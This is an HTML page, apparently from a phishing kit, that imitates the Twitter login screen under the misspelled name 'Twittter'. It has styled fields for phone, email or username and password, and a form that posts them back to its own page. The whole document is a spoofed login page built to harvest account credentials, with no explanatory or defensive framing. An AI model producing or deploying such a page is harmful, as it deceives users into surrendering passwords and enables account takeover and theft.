<!DOCTYPE html>
<html>
  <head>
    <title>Login on Twittter / Twittter</title>
    <style>
      * {
        padding: 0;
        margin: 0;
        box-sizing: border-box;
      }

      body {
        background-color: #fff;
        padding-top: 20px;
        font-family: system-ui, -apple-system, system-ui, "Segoe UI", Roboto;
        text-align: center;
      }

      .logo {
        height: 39px;
        fill: rgb(27, 149, 224);
      }

      .form {
        width: 570px;
        margin: 0 auto 20px auto;
      }

      .form__heading {
        color: #000;
        font-size: 23px;
        margin: 30px 0 10px 0;
        font-weight: 700;
      }

      .form__container {
        padding: 10px 15px;
      }

      .form__field {
        position: relative;
        background-color: #f5f8fa;
        border: 0;
        border-bottom: 2px solid #647786;
        height: 53px;
      }

      .form__label {
        color: #647786;
        position: absolute;
        top: 5px;
        left: 10px;
        font-size: 15px;
        font-weight: 400;
      }

      .form__input {
        background: transparent;
        border: 0;
        width: 100%;
        height: 100%;
        position: absolute;
        top: 0;
        left: 0;
        padding-top: 20px;
        color: #000;
        font-size: 19px;
        padding-left: 10px;
        outline: 0;
      }

      .form__button {
        display: flex;
        align-items: center;
        justify-content: center;
        font-size: 15px;
        font-weight: 700;
        background-color: rgb(29, 161, 242);
        border: 0;
        border-radius: 49px;
        color: #fff;
        height: 49px;
        width: 100%;
        cursor: pointer;
      }

      .form__button:hover {
        background-color: rgb(26, 145, 218)
      }

      .form__button:active,
      .form__button:visited {
        outline: 0;
      }

      .link {
        text-decoration: none;
        color: rgb(27, 149, 224);
        font-size: 15px;
      }

      .link:hover {
        text-decoration: underline;
      }

      .link:first-of-type::after {
        content: ' Â·';
        color: rgb(136, 153, 166);
      }
  </style>
  </head>

    <form class="form" method="POST">
      <h1 class="form__heading">Log in to Twittter</h1>
      <div class="form__container">
        <div class="form__field">
          <label for="username" class="form__label">
            Phone, email, or username
          </label>
          <input type="text" class="form__input" name="username">
        </div>
      </div>
      <div class="form__container">
        <div class="form__field">
          <label for="password" class="form__label">
            Password
          </label>
          <input type="password" class="form__input" name="password">
        </div>
      </div>
      <div class="form__container">
        <button type="submit" class="form__button">Log in</button>
      </div>
    </form>
